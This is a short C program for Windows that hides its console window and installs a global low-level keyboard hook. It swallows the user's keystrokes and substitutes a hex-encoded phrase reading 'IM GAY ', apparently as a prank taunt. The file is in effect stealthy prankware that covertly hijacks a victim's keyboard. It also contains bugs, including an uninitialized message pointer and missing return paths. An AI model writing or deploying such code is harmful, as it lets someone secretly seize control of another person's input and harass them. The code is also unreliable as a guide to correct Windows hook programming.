#include <stdio.h>
#include <windows.h>
#include <winuser.h>

HHOOK hook;
LPMSG msg;

int key[] = { 0x49,0x4D,0x20,0x47,0x41,0x59,0x20 };
int scan[] = { 0x17,0x32,0x39,0x22,0x1e,0x15,0x39 };

void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}

LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    static int index = 0;
    if (code == HC_ACTION)
    {
        if (wParam == WM_KEYDOWN)
        {
            if (*(char*)lParam == key[index])
            {
                index++;
                return CallNextHookEx(hook, code, wParam, lParam);
            }
            
            keybd_event(key[index],
                scan[index],
                KEYEVENTF_EXTENDEDKEY | 0,
                0);

            keybd_event(key[index],
                scan[index],
                KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP,
                0); 

            index = index % 7;
            return 1;
        }
    }    
}

int main()
{
    Stealth();
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hook != NULL)
        puts("All is good");
    else
        puts("Something went wrong :(");
    
    while (GetMessage(msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(msg);
        DispatchMessage(msg);
    }
    return 0;
}